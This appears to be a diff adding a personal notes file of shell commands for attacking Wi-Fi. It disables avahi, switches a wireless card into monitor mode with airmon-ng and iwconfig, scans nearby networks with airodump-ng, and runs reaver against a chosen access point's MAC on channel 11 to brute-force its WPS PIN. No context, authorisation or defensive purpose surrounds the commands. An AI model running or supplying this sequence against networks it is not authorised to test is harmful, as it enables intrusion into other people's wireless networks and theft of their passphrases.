@@ -1,0 +1,19 @@
+systemctl disable avahi-daemon.service
+
+airmon-ng start wlp24s0 // time error occurred problem is solved.
+ 
+
+
+ifconfig wlp24s0 down
+iwconfig wlp24s0 mode monitor 
+ifconfig wlp24s0 up
+
+
+
+
+airmon-ng check wlp24s0
+
+airodump-ng wlp24s0 
+
+reaver -b “MAC”  -i wlp24s0 -c 11 -vv
+
